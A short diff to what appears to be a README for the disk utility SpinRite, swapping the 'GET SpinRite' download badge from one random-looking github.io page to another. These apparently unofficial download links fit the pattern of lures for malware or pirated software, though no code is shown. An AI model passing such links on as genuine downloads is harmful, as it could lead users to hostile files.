@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://ncto.org/wp-content/uploads/2020/04/Spinrite.png)
 
-[![GET SpinRite](https://img.shields.io/badge/GET%20%E2%80%94%20SpinRite-0078D6?style=for-the-badge&logoColor=white)](https://westynsharprdzi.github.io/.github/spinrite)
+[![GET SpinRite](https://img.shields.io/badge/GET%20%E2%80%94%20SpinRite-0078D6?style=for-the-badge&logoColor=white)](https://dustinphelpsizuu.github.io/.github/spinRite-download)
 
 ---
 
